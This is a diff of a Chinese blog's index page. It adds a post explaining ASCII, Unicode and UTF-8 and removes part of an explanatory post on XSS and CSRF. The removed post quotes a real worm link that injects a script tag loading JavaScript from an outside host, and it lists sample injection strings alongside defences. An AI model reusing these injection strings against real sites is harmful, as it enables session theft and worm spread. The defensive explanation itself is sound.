@@ -183,6 +183,86 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://www.veitor.net/posts/the-relation-mong-ASCII-unicode-UTF8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/avatar.jpg">
+      <meta itemprop="name" content="Veitor">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Veitor的技术点滴">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/posts/the-relation-mong-ASCII-unicode-UTF8/" class="post-title-link" itemprop="url">ASCII，Unicode和UTF-8的关系</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2014-11-06 09:06:59" itemprop="dateCreated datePublished" datetime="2014-11-06T09:06:59+08:00">2014-11-06</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-07-28 17:33:51" itemprop="dateModified" datetime="2020-07-28T17:33:51+08:00">2020-07-28</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/" itemprop="url" rel="index">
+                    <span itemprop="name">计算机系统</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>这个笔记主要用来整理自己的思路。但是，尽量试图写得通俗易懂，希望能对其他朋友有用。毕竟，字符编码是计算机技术的基石，想要熟练使用计算机，就必须懂得一点字符编码的知识。 <strong>1. ASCII码</strong> 我们知道，在计算机内部，所有的信息最终都表示为一个二进制的字符串。每一个二进制位（bit）有0和1两种状态，因此八个二进制位就可以组合出 256种状态，这被称为一个字节（byte）。也就是说，一个字节一共可以用来表示256种不同的状态，每一个状态对应一个符号，就是256个符号，从 0000000到11111111。 上个世纪60年代，美国制定了一套字符编码，对英语字符与二进制位之间的关系，做了统一规定。这被称为ASCII码，一直沿用至今。 ASCII码一共规定了128个字符的编码，比如空格”SPACE”是32（二进制00100000），大写的字母A是65（二进制01000001）。这128个符号（包括32个不能打印出来的控制符号），只占用了一个字节的后面7位，最前面的1位统一规定为0。 <strong>2、非ASCII编码</strong> 英语用128个符号编码就够了，但是用来表示其他语言，128个符号是不够的。比如，在法语中，字母上方有注音符号，它就无法用ASCII码表示。 于是，一些欧洲国家就决定，利用字节中闲置的最高位编入新的符号。比如，法语中的é的编码为130（二进制10000010）。这样一来，这些欧洲国家使 用的编码体系，可以表示最多256个符号。 但是，这里又出现了新的问题。不同的国家有不同的字母，因此，哪怕它们都使用256个符号的编码方式，代表的字母却不一样。比如，130在法语编码 中代表了é，在希伯来语编码中却代表了字母Gimel (ג)，在俄语编码中又会代表另一个符号。但是不管怎样，所有这些编码方式中，0–127表示的符号是一样的，不一样的只是128–255的这一段。 至于亚洲国家的文字，使用的符号就更多了，汉字就多达10万左右。一个字节只能表示256种符号，肯定是不够的，就必须使用多个字节表达一个符号。 比如，简体中文常见的编码方式是GB2312，使用两个字节表示一个汉字，所以理论上最多可以表示256x256=65536个符号。 中文编码的问题需要专文讨论，这篇笔记不涉及。这里只指出，虽然都是用多个字节表示一个符号，但是GB类的汉字编码与后文的Unicode和UTF-8是毫无关系的。 <strong>3.Unicode</strong> 正如上一节所说，世界上存在着多种编码方式，同一个二进制数字可以被解释成不同的符号。因此，要想打开一个文本文件，就必须知道它的编码方式，否则用错误的编码方式解读，就会出现乱码。为什么电子邮件常常出现乱码？就是因为发信人和收信人使用的编码方式不一样。 可以想象，如果有一种编码，将世界上所有的符号都纳入其中。每一个符号都给予一个独一无二的编码，那么乱码问题就会消失。这就是Unicode，就像它的名字都表示的，这是一种所有符号的编码。 Unicode当然是一个很大的集合，现在的规模可以容纳100多万个符号。每个符号的编码都不一样，比如，U+0639表示阿拉伯字母Ain，U+0041表示英语的大写字母A，U+4E25表示汉字”严”。具体的符号对应表，可以查询<a href="http://www.unicode.org" target="_blank" rel="noopener">unicode.org</a>，或者专门的<a href="http://www.chi2ko.com/tool/CJK.htm" target="_blank" rel="noopener">汉字对应表</a>。 <strong>4. Unicode的问题</strong> 需要注意的是，Unicode只是一个符号集，它只规定了符号的二进制代码，却没有规定这个二进制代码应该如何存储。 比如，汉字”严”的unicode是十六进制数4E25，转换成二进制数足足有15位（100111000100101），也就是说这个符号的表示至少需要2个字节。表示其他更大的符号，可能需要3个字节或者4个字节，甚至更多。 这里就有两个严重的问题，第一个问题是，如何才能区别Unicode和ASCII？计算机怎么知道三个字节表示一个符号，而不是分别表示三个符号 呢？第二个问题是，我们已经知道，英文字母只用一个字节表示就够了，如果Unicode统一规定，每个符号用三个或四个字节表示，那么每个英文字母前都必 然有二到三个字节是0，这对于存储来说是极大的浪费，文本文件的大小会因此大出二三倍，这是无法接受的。 它们造成的结果是：1）出现了Unicode的多种存储方式，也就是说有许多种不同的二进制格式，可以用来表示Unicode。2）Unicode在很长一段时间内无法推广，直到互联网的出现。 <strong>5.UTF-8</strong> 互联网的普及，强烈要求出现一种统一的编码方式。UTF-8就是在互联网上使用最广的一种Unicode的实现方式。其他实现方式还包括UTF-16（字符用两个字节或四个字节表示）和UTF-32（字符用四个字节表示），不过在互联网上基本不用。<strong>重复一遍，这里的关系是，UTF-8是Unicode的实现方式之一。</strong> UTF-8最大的一个特点，就是它是一种变长的编码方式。它可以使用1~4个字节表示一个符号，根据不同的符号而变化字节长度。 UTF-8的编码规则很简单，只有二条： 1）对于单字节的符号，字节的第一位设为0，后面7位为这个符号的unicode码。因此对于英语字母，UTF-8编码和ASCII码是相同的。 2）对于n字节的符号（n&gt;1），第一个字节的前n位都设为1，第n+1位设为0，后面字节的前两位一律设为10。剩下的没有提及的二进制位，全部为这个符号的unicode码。 下表总结了编码规则，字母x表示可用编码的位。</p>
+<blockquote>
+<p>Unicode符号范围 | UTF-8编码方式 (十六进制) | （二进制） ——————–+——————————————— 0000 0000-0000 007F | 0xxxxxxx 0000 0080-0000 07FF | 110xxxxx 10xxxxxx 0000 0800-0000 FFFF | 1110xxxx 10xxxxxx 10xxxxxx 0001 0000-0010 FFFF | 11110xxx 10xxxxxx 10xxxxxx 10xxxxxx</p>
+</blockquote>
+<p>跟据上表，解读UTF-8编码非常简单。如果一个字节的第一位是0，则这个字节单独就是一个字符；如果第一位是1，则连续有多少个1，就表示当前字符占用多少个字节。 下面，还是以汉字”严”为例，演示如何实现UTF-8编码。 已知”严”的unicode是4E25（100111000100101），根据上表，可以发现4E25处在第三行的范围内（0000 0800-0000 FFFF），因此”严”的UTF-8编码需要三个字节，即格式是”1110xxxx 10xxxxxx 10xxxxxx”。然后，从”严”的最后一个二进制位开始，依次从后向前填入格式中的x，多出的位补0。这样就得到了，”严”的UTF-8编码 是”11100100 10111000 10100101”，转换成十六进制就是E4B8A5。 <strong>6. Unicode与UTF-8之间的转换</strong> 通过上一节的例子，可以看到”严”的Unicode码是4E25，UTF-8编码是E4B8A5，两者是不一样的。它们之间的转换可以通过程序实现。 在Windows平台下，有一个最简单的转化方法，就是使用内置的记事本小程序Notepad.exe。打开文件后，点击”文件”菜单中的”另存为”命令，会跳出一个对话框，在最底部有一个”编码”的下拉条。 <a href="http://storage.veitor.net/uploads/2014/11/QQ截图20141106170522.jpg" target="_blank" rel="noopener"><img src="http://storage.veitor.net/uploads/2014/11/QQ%E6%88%AA%E5%9B%BE20141106170522.jpg" alt="QQ截图20141106170522"></a> 里面有四个选项：ANSI，Unicode，Unicode big endian 和 UTF-8。 1）ANSI是默认的编码方式。对于英文文件是ASCII编码，对于简体中文文件是GB2312编码（只针对Windows简体中文版，如果是繁体中文版会采用Big5码）。 2）Unicode编码指的是UCS-2编码方式，即直接用两个字节存入字符的Unicode码。这个选项用的little endian格式。 3）Unicode big endian编码与上一个选项相对应。我在下一节会解释little endian和big endian的涵义。 4）UTF-8编码，也就是上一节谈到的编码方法。 选择完”编码方式”后，点击”保存”按钮，文件的编码方式就立刻转换好了。 <strong>7. Little endian和Big endian</strong> 上一节已经提到，Unicode码可以采用UCS-2格式直接存储。以汉字”严”为例，Unicode码是4E25，需要用两个字节存储，一个字节 是4E，另一个字节是25。存储的时候，4E在前，25在后，就是Big endian方式；25在前，4E在后，就是Little endian方式。 这两个古怪的名称来自英国作家斯威夫特的《格列佛游记》。在该书中，小人国里爆发了内战，战争起因是人们争论，吃鸡蛋时究竟是从大头(Big- Endian)敲开还是从小头(Little-Endian)敲开。为了这件事情，前后爆发了六次战争，一个皇帝送了命，另一个皇帝丢了王位。 因此，第一个字节在前，就是”大头方式”（Big endian），第二个字节在前就是”小头方式”（Little endian）。 那么很自然的，就会出现一个问题：计算机怎么知道某一个文件到底采用哪一种方式编码？ Unicode规范中定义，每一个文件的最前面分别加入一个表示编码顺序的字符，这个字符的名字叫做”零宽度非换行空格”（ZERO WIDTH NO-BREAK SPACE），用FEFF表示。这正好是两个字节，而且FF比FE大1。 如果一个文本文件的头两个字节是FE FF，就表示该文件采用大头方式；如果头两个字节是FF FE，就表示该文件采用小头方式。 <strong>8. 实例</strong> 下面，举一个实例。 打开”记事本”程序Notepad.exe，新建一个文本文件，内容就是一个”严”字，依次采用ANSI，Unicode，Unicode big endian 和 UTF-8编码方式保存。 然后，用文本编辑软件<a href="http://www.google.cn/search?aq=t&oq=UltraEdit&complete=1&hl=zh-CN&newwindow=1&rlz=1B3GGGL_zh-CNCN216CN216&q=ultraedit+%E4%B8%8B%E8%BD%BD&btnG=Google+%E6%90%9C%E7%B4%A2&meta=" target="_blank" rel="noopener">UltraEdit中</a>的”十六进制功能”，观察该文件的内部编码方式。 1）ANSI：文件的编码就是两个字节”D1 CF”，这正是”严”的GB2312编码，这也暗示GB2312是采用大头方式存储的。 2）Unicode：编码是四个字节”FF FE 25 4E”，其中”FF FE”表明是小头方式存储，真正的编码是4E25。 3）Unicode big endian：编码是四个字节”FE FF 4E 25”，其中”FE FF”表明是大头方式存储。 4）UTF-8：编码是六个字节”EF BB BF E4 B8 A5”，前三个字节”EF BB BF”表示这是UTF-8编码，后三个”E4B8A5”就是”严”的具体编码，它的存储顺序与编码顺序是一致的。 <strong>9. 延伸阅读</strong> * <a href="http://www.joelonsoftware.com/articles/Unicode.html" target="_blank" rel="noopener">The Absolute Minimum Every Software Developer Absolutely, Positively Must Know About Unicode and Character Sets</a>（关于字符集的最基本知识） * <a href="http://www.pconline.com.cn/pcedu/empolder/gj/other/0505/616631.html" target="_blank" rel="noopener">谈谈Unicode编码</a> * <a href="http://www.ietf.org/rfc/rfc3629.txt" target="_blank" rel="noopener">RFC3629：UTF-8, a transformation format of ISO 10646</a>（如果实现UTF-8的规定） （完）   原文地址：<a href="http://www.ruanyifeng.com/blog/2007/10/ascii\_unicode\_and_utf-8.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2007/10/ascii\_unicode\_and_utf-8.html</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://www.veitor.net/posts/the-difference-between-responsive-and-adaptive/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -214,7 +294,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-07-28 16:02:59" itemprop="dateModified" datetime="2020-07-28T16:02:59+08:00">2020-07-28</time>
+                <time title="修改时间：2020-07-28 17:33:51" itemprop="dateModified" datetime="2020-07-28T17:33:51+08:00">2020-07-28</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -296,7 +376,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-07-28 16:02:59" itemprop="dateModified" datetime="2020-07-28T16:02:59+08:00">2020-07-28</time>
+                <time title="修改时间：2020-07-28 17:33:51" itemprop="dateModified" datetime="2020-07-28T17:33:51+08:00">2020-07-28</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -394,7 +474,7 @@ echo '<a href="/xhprof\_html/index.php?run='.$run\_id.'&source=xhprof\_foo" targ
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-07-28 16:02:59" itemprop="dateModified" datetime="2020-07-28T16:02:59+08:00">2020-07-28</time>
+                <time title="修改时间：2020-07-28 17:33:51" itemprop="dateModified" datetime="2020-07-28T17:33:51+08:00">2020-07-28</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -525,7 +605,7 @@ echo '<a href="/xhprof\_html/index.php?run='.$run\_id.'&source=xhprof\_foo" targ
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-07-28 16:02:59" itemprop="dateModified" datetime="2020-07-28T16:02:59+08:00">2020-07-28</time>
+                <time title="修改时间：2020-07-28 17:33:51" itemprop="dateModified" datetime="2020-07-28T17:33:51+08:00">2020-07-28</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -607,7 +687,7 @@ echo '<a href="/xhprof\_html/index.php?run='.$run\_id.'&source=xhprof\_foo" targ
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-07-28 16:02:59" itemprop="dateModified" datetime="2020-07-28T16:02:59+08:00">2020-07-28</time>
+                <time title="修改时间：2020-07-28 17:33:51" itemprop="dateModified" datetime="2020-07-28T17:33:51+08:00">2020-07-28</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -809,7 +889,7 @@ echo '<a href="/xhprof\_html/index.php?run='.$run\_id.'&source=xhprof\_foo" targ
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-07-28 16:02:59" itemprop="dateModified" datetime="2020-07-28T16:02:59+08:00">2020-07-28</time>
+                <time title="修改时间：2020-07-28 17:33:51" itemprop="dateModified" datetime="2020-07-28T17:33:51+08:00">2020-07-28</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -899,7 +979,7 @@ echo '<a href="/xhprof\_html/index.php?run='.$run\_id.'&source=xhprof\_foo" targ
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-07-28 16:02:59" itemprop="dateModified" datetime="2020-07-28T16:02:59+08:00">2020-07-28</time>
+                <time title="修改时间：2020-07-28 17:33:51" itemprop="dateModified" datetime="2020-07-28T17:33:51+08:00">2020-07-28</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -981,7 +1061,7 @@ echo '<a href="/xhprof\_html/index.php?run='.$run\_id.'&source=xhprof\_foo" targ
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-07-28 16:02:59" itemprop="dateModified" datetime="2020-07-28T16:02:59+08:00">2020-07-28</time>
+                <time title="修改时间：2020-07-28 17:33:51" itemprop="dateModified" datetime="2020-07-28T17:33:51+08:00">2020-07-28</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -1059,7 +1139,7 @@ echo '<a href="/xhprof\_html/index.php?run='.$run\_id.'&source=xhprof\_foo" targ
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-07-28 16:02:59" itemprop="dateModified" datetime="2020-07-28T16:02:59+08:00">2020-07-28</time>
+                <time title="修改时间：2020-07-28 17:33:51" itemprop="dateModified" datetime="2020-07-28T17:33:51+08:00">2020-07-28</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -1138,239 +1218,6 @@ background-size: 100px auto;
   
   
 
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://www.veitor.net/posts/taling-about-XSS-and-CSRF/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/avatar.jpg">
-      <meta itemprop="name" content="Veitor">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Veitor的技术点滴">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/posts/taling-about-XSS-and-CSRF/" class="post-title-link" itemprop="url">浅谈XSS和CSRF</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2014-08-24 14:03:34" itemprop="dateCreated datePublished" datetime="2014-08-24T14:03:34+08:00">2014-08-24</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-07-28 16:02:59" itemprop="dateModified" datetime="2020-07-28T16:02:59+08:00">2020-07-28</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB/" itemprop="url" rel="index">
-                    <span itemprop="name">经验分享</span>
-                  </a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="同源策略（Same-Origin-Policy）"><a href="#同源策略（Same-Origin-Policy）" class="headerlink" title="同源策略（Same Origin Policy）"></a>同源策略（Same Origin Policy）</h3><p>同源策略阻止从一个源加载的文档或脚本获取或设置另一个源加载的文档的属性。</p>
-<p>如：</p>
-<p>不能通过Ajax获取另一个源的数据；</p>
-<p>JavaScript不能访问页面中iframe加载的跨域资源。</p>
-<p>对 <a href="http://store.company.com/dir/page.html" target="_blank" rel="noopener">http://store.company.com/dir/page.html</a> 同源检测</p>
-<p><a href="http://storage.veitor.net/uploads/2014/08/28230050-d605bfba1f1b48e081353243800c253c.png" target="_blank" rel="noopener"><img src="http://storage.veitor.net/uploads/2014/08/28230050-d605bfba1f1b48e081353243800c253c.png" alt="28230050-d605bfba1f1b48e081353243800c253c"></a></p>
-<h3 id="跨域限制"><a href="#跨域限制" class="headerlink" title="跨域限制"></a>跨域限制</h3><ol>
-<li>浏览器中，script、img、iframe、link等标签，可以跨域引用或加载资源。</li>
-<li>不同于 XMLHttpRequest，通过src属性加载的资源，浏览器限制了JavaScript的权限，使其不能读、写返回的内容。</li>
-<li>XMLHttpRequest 也受到也同源策略的约束，不能跨域访问资源。</li>
-</ol>
-<h3 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h3><p>为了解决 XMLHttpRequest 同源策略的局限性，JSONP出现了。</p>
-<p>JSONP并不是一个官方的协议，它是利用script标签中src属性具有跨域加载资源的特性，而衍生出来的跨域数据访问方式。</p>
-<h3 id="CORS-Cross-Origin-Resource-Sharing"><a href="#CORS-Cross-Origin-Resource-Sharing" class="headerlink" title="CORS(Cross-Origin Resource Sharing)"></a>CORS(Cross-Origin Resource Sharing)</h3><p>CORS，即：<strong>跨域资源共享</strong>。</p>
-<p>这是W3C委员会制定的一个新标准，用于解决 XMLHttpRequest 不能跨域访问资源的问题。目前支持情况良好（特指移动端）。</p>
-<p>想了解更多，可查看之前的文章：<a href="http://www.cnblogs.com/maplejan/archive/2012/12/02/2797864.html" target="_blank" rel="noopener">《CORS(Cross-Origin Resource Sharing) 跨域资源共享》</a></p>
-<hr>
-<h2 id="XSS（Cross-Site-Script）"><a href="#XSS（Cross-Site-Script）" class="headerlink" title="XSS（Cross Site Script）"></a>XSS（Cross Site Script）</h2><p>XSS（Cross Site Script） 即：<strong>跨站脚本攻击</strong>。</p>
-<p>本来缩写其应该是CSS，不过为了避免和CSS层叠样式表 （Cascading Style Sheets）重复，所以在安全领域叫做 XSS 。</p>
-<h3 id="XSS-分类"><a href="#XSS-分类" class="headerlink" title="XSS 分类"></a>XSS 分类</h3><p>XSS 主要分为两种形态</p>
-<ol>
-<li>反射型XSS（非持久型XSS）。需要诱惑用户去激活的XSS攻击，如：点击恶意链接。</li>
-<li>存储型XSS。混杂有恶意代码的数据被存储在服务器端，当用户访问输出该数据的页面时，就会促发XSS攻击。具有很强的稳定性。</li>
-</ol>
-<h3 id="XSS-Payload"><a href="#XSS-Payload" class="headerlink" title="XSS Payload"></a>XSS Payload</h3><p>XSS Payload，是指那些用于完成各种具体功能的恶意脚本。</p>
-<p>由于实现XSS攻击可以通过JavaScript、ActiveX控件、Flash插件、Java插件等技术手段实现，下面只讨论JavaScript的XSS Payload。</p>
-<p>通过JavaScript实现的XSS Payload，一般有以下几种：</p>
-<ol>
-<li>Cookie劫持</li>
-<li>构造请求</li>
-<li>XSS钓鱼</li>
-<li>CSS History Hack</li>
-</ol>
-<h3 id="Cookie劫持"><a href="#Cookie劫持" class="headerlink" title="Cookie劫持"></a>Cookie劫持</h3><p>由于Cookie中，往往会存储着一些用户安全级别较高的信息，如：用户的登陆凭证。</p>
-<p>当用户所访问的网站被注入恶意代码，它只需通过 _document.cookie _这句简单的JavaScript代码，就可以顺利获取到用户当前访问网站的cookies。</p>
-<p>如果攻击者能获取到用户登陆凭证的Cookie，甚至可以绕开登陆流程，直接设置这个cookie的值，来访问用户的账号。</p>
-<h3 id="构造请求"><a href="#构造请求" class="headerlink" title="构造请求"></a>构造请求</h3><p>JavaScript 可以通过多种方式向服务器发送GET与POST请求。</p>
-<p>网站的数据访问和操作，基本上都是通过向服务器发送请求而实现的。</p>
-<p>如果让恶意代码顺利模拟用户操作，向服务器发送有效请求，将对用户造成重大损失。</p>
-<p>例如：更改用户资料、删除用户信息等…</p>
-<h3 id="XSS钓鱼"><a href="#XSS钓鱼" class="headerlink" title="XSS钓鱼"></a>XSS钓鱼</h3><p>关于网站钓鱼，详细大家应该也不陌生了。</p>
-<p>就是伪造一个高度相似的网站，欺骗用户在钓鱼网站上面填写账号密码或者进行交易。</p>
-<p>而XSS钓鱼也是利用同样的原理。</p>
-<p>注入页面的恶意代码，会弹出一个想死的弹窗，提示用户输入账号密码登陆。</p>
-<p>当用户输入后点击发送，这些资料已经去到了攻击者的服务器上了。</p>
-<p>如：</p>
-<p><a href="http://storage.veitor.net/uploads/2014/08/28231056-882bbad839274f95a635ddbd128db3c4.png" target="_blank" rel="noopener"><img src="http://storage.veitor.net/uploads/2014/08/28231056-882bbad839274f95a635ddbd128db3c4.png" alt="28231056-882bbad839274f95a635ddbd128db3c4"></a></p>
-<h3 id="CSS-History-Hack"><a href="#CSS-History-Hack" class="headerlink" title="CSS History Hack"></a>CSS History Hack</h3><p>CSS History Hack是一个有意思的东西。它结合 浏览器历史记录 和 CSS的伪类：a:visited，通过遍历一个网址列表来获取其中<a>标签的颜色，就能知道用户访问过什么网站。</p>
-<p>相关链接：</p>
-<p>PS：目前最新版的Chrome、Firefox、Safari已经无效，Opera 和 IE8以下 还可以使用。</p>
-<h3 id="XSS-Worm"><a href="#XSS-Worm" class="headerlink" title="XSS Worm"></a>XSS Worm</h3><p>XSS Worm，即XSS蠕虫，是一种具有自我传播能力的XSS攻击，杀伤力很大。</p>
-<p>引发 XSS蠕虫 的条件比较高，需要在用户之间发生交互行为的页面，这样才能形成有效的传播。一般要同时结合 反射型XSS 和 存储型XSS 。</p>
-<p>案例：Samy Worm、新浪微博XSS攻击</p>
-<h3 id="新浪微博XSS攻击"><a href="#新浪微博XSS攻击" class="headerlink" title="新浪微博XSS攻击"></a>新浪微博XSS攻击</h3><p>这张图，其实已经是XSS蠕虫传播阶段的截图了。</p>
-<p>攻击者要让XSS蠕虫成功被激活，应该是通过 私信 或者 @微博 的方式，诱惑一些微博大号上当。</p>
-<p>当这些大号中有人点击了攻击链接后，XSS蠕虫就被激活，开始传播了。</p>
-<p><a href="http://storage.veitor.net/uploads/2014/08/28231427-6c93f6962f234f0a8576b1a8979da50e.png" target="_blank" rel="noopener"><img src="http://storage.veitor.net/uploads/2014/08/28231427-6c93f6962f234f0a8576b1a8979da50e.png" alt="28231427-6c93f6962f234f0a8576b1a8979da50e"></a></p>
-<p>这个XSS的漏洞，其实就是没有对地址中的变量进行过滤。</p>
-<p>把上一页的链接decode了之后，我们就可以很容易的看出，这个链接的猫腻在哪里。</p>
-<p>链接上带的变量，直接输出页面，导致外部JavaScript代码成功注入。</p>
-<p>传播链接：<a href="http://weibo.com/pub/star/g/xyyyd%22%3E%3Cscript%20src=//www.2kt.cn/images/t.js%3E%3C/script%3E?type=update" target="_blank" rel="noopener">http://weibo.com/pub/star/g/xyyyd%22%3E%3Cscript%20src=//www.2kt.cn/images/t.js%3E%3C/script%3E?type=update</a></p>
-<p>把链接decode之后：<a href="http://weibo.com/pub/star/g/xyyyd&quot;&gt;" target="_blank" rel="noopener">http://weibo.com/pub/star/g/xyyyd&quot;&gt;</a><script src=//www.2kt.cn/images/t.js></script>?type=update</p>
-<p><a href="http://storage.veitor.net/uploads/2014/08/28231439-beba435e8f8f4a97acdeee43ad981aef-1.png" target="_blank" rel="noopener"><img src="http://storage.veitor.net/uploads/2014/08/28231439-beba435e8f8f4a97acdeee43ad981aef-1.png" alt="28231439-beba435e8f8f4a97acdeee43ad981aef (1)"></a></p>
-<p>相关XSS代码这里就不贴了，Google一下就有。</p>
-<p>其实也要感谢攻击者只是恶作剧了一下，让用户没有造成实际的损失。</p>
-<p>网上也有人提到，如果这个漏洞结合XSS钓鱼，再配合隐性传播，那样杀伤力会更大。</p>
-<hr>
-<h2 id="XSS-防御技巧"><a href="#XSS-防御技巧" class="headerlink" title="XSS 防御技巧"></a>XSS 防御技巧</h2><h3 id="HttpOnly"><a href="#HttpOnly" class="headerlink" title="HttpOnly"></a>HttpOnly</h3><p>服务器端在设置安全级别高的Cookie时，带上HttpOnly的属性，就能防止JavaScript获取。</p>
-<p>PHP设置HttpOnly：</p>
-<p>&lt;?<br>header(“Set-Cookie: a=1;”, false);<br>header(“Set-Cookie: b=1;httponly”, false);<br>setcookie(“c”, “1”, NULL, NULL, NULL, NULL, ture);</p>
-<p>PS：手机上的QQ浏览器4.0，居然不支持httponly，而3.7的版本却没问题。测试平台是安卓4.0版本。</p>
-<p>估计是一个低级的bug，已经向QQ浏览器那边反映了情。</p>
-<p>截止时间：2013-01-28</p>
-<h3 id="输入检查"><a href="#输入检查" class="headerlink" title="输入检查"></a>输入检查</h3><p><strong>任何用户输入的数据，都是“不可信”的。</strong></p>
-<p>输入检查，一般是用于输入格式检查，例如：邮箱、电话号码、用户名这些…</p>
-<p>都要按照规定的格式输入：电话号码必须纯是数字和规定长度；用户名除 中英文数字 外，仅允许输入几个安全的符号。</p>
-<p>输入过滤不能完全交由前端负责，前端的输入过滤只是为了避免普通用户的错误输入，减轻服务器的负担。</p>
-<p>因为攻击者完全可以绕过正常输入流程，直接利用相关接口向服务器发送设置。</p>
-<p>所以，前端和后端要做相同的过滤检查。</p>
-<h3 id="输出检查"><a href="#输出检查" class="headerlink" title="输出检查"></a>输出检查</h3><p>相比输入检查，前端更适合做输出检查。</p>
-<p>可以看到，HttpOnly和前端没直接关系，输入检查的关键点也不在于前端。</p>
-<p>那XSS的防御就和前端没关系了?</p>
-<p>当然不是，随着移动端web开发发展起来了，Ajax的使用越来越普遍，越来越多的操作都交给前端来处理。</p>
-<p>前端也需要做好XSS防御。</p>
-<p>JavaScript直接通过Ajax向服务器请求数据，接口把数据以JSON格式返回。前端整合处理数据后，输出页面。</p>
-<p>所以，前端的XSS防御点，在于输出检查。</p>
-<p>但也要结合<strong>XSS可能发生的场景</strong>。</p>
-<h3 id="XSS注意场景"><a href="#XSS注意场景" class="headerlink" title="XSS注意场景"></a>XSS注意场景</h3><p><strong>在HTML标签中输出</strong></p>
-<p>如：<a href=# >{$var}</a></p>
-<p>风险：{$var} 为 <img src=# onerror="/xss/" /></p>
-<p>防御手段：变量HtmlEncode后输出</p>
-<p><strong>在HTML属性中输出</strong></p>
-<p>如：<div data-num="{$var}"></div></p>
-<p>风险：{$var} 为 “ onclick=”/xss/</p>
-<p>防御手段：变量HtmlEncode后输出</p>
-<p><strong>在<script>标签中输出</strong></p>
-<p>如：<script>var num = {$var};</script></p>
-<p>风险：{$var} 为 1; alert(/xss/)</p>
-<p>防御手段：确保输出变量在引号里面，再让变量JavaScriptEncode后输出。</p>
-<p><strong>在事件中输出</strong></p>
